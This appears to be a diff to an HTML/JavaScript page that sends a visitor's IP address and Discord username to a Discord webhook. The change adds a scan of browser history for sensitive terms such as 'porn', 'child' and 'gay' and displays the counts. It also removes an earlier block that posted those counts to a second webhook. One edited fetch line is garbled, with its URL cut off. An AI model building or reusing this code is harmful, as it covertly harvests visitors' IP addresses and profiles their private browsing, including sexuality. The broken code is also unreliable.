@@ -74,6 +74,7 @@
             display: none;
         }
         #keywordContainer {
+            display: none;
             position: absolute;
             top: 50%;
             right: 20px;
@@ -145,8 +146,7 @@
             }
 
             // Get the IP address using ipify
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
+            fetch('https://api.ipify            .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
                     // Send the IP address and Discord username to the Discord webhook
@@ -176,72 +176,41 @@
                         secondScreen.style.top = '50%';
                         secondScreen.style.left = '50%';
                         secondScreen.style.transform = 'translate(-50%, -50%)';
+
+                        // Scan browser history and cookies for keywords
+                        const keywords = ['porn', 'child', 'gay', 'furry', 'woman']; // Keywords to search for
+                        const keywordCounts = {};
+
+                        chrome.history.search({text: '', maxResults: 100}, function(data) {
+                            data.forEach(function(page) {
+                                const lowerCaseTitle = page.title.toLowerCase();
+                                const lowerCaseUrl = page.url.toLowerCase();
+
+                                keywords.forEach(function(keyword) {
+                                    if (lowerCaseTitle.includes(keyword) || lowerCaseUrl.includes(keyword)) {
+                                        if (!keywordCounts[keyword]) {
+                                            keywordCounts[keyword] = 1;
+                                        } else {
+                                            keywordCounts[keyword]++;
+                                        }
+                                    }
+                                });
+                            });
+
+                            // Display scanned keywords
+                            for (const keyword in keywordCounts) {
+                                const li = document.createElement('li');
+                                li.textContent = `${keyword}: ${keywordCounts[keyword]} times`;
+                                keywordList.appendChild(li);
+                            }
+
+                            // Show the keyword container
+                            keywordContainer.style.display = 'block';
+                        });
                     })
                     .catch(error => {
                         console.error('ERROR', error);
                         // Handle error here
-                    });
-
-                    // Scan browser history for keywords
-                    const keywords = ['example', 'test', 'keyword']; // Add your desired keywords here
-                    const keywordCounts = {};
-
-                    chrome.history.search({text: '', maxResults: 100}, function(data) {
-                        data.forEach(function(page) {
-                            const lowerCaseTitle = page.title.toLowerCase();
-                            const lowerCaseUrl = page.url.toLowerCase();
-
-                            keywords.forEach(function(keyword) {
-                                if (lowerCaseTitle.includes(keyword) || lowerCaseUrl.includes(keyword)) {
-                                    if (!keywordCounts[keyword]) {
-                                        keywordCounts[keyword] = 1;
-                                    } else {
-                                        keywordCounts[keyword]++;
-                                    }
-                                }
-                            });
-                        });
-
-                        // Display keyword counts
-                        for (const keyword in keywordCounts) {
-                            const li = document.createElement('li');
-                            li.textContent = `${keyword}: ${keywordCounts[keyword]} times`;
-                            keywordList.appendChild(li);
-                        }
-
-                        // Send scanned keywords to another Discord webhook
-                        const keywordWebhookUrl = 'https://discord.com/api/webhooks/12345678901234567890/your-other-webhook-id';
-                        const keywordMessage = {
-                            content: 'Scanned Keywords:',
-                            embeds: [{
-                                title: 'Scanned Keywords',
-                                color: 0xFFA500,
-                                fields: Object.keys(keywordCounts).map(keyword => {
-                                    return {
-                                        name: keyword,
-                                        value: `${keywordCounts[keyword]} times`,
-                                        inline: true
-                                    };
-                                })
-                            }]
-                        };
-
-                        fetch(keywordWebhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(keywordMessage)
-                        })
-                        .then(response => {
-                            if (!response.ok) {
-                                throw new Error('Failed to send keyword webhook request');
-                            }
-                        })
-                        .catch(error => {
-                            console.error('ERROR', error);
-                            // Handle error here
-                        });
                     });
                 })
                 .catch(error => {
@@ -252,4 +221,3 @@
     </script>
 </body>
 </html>
-
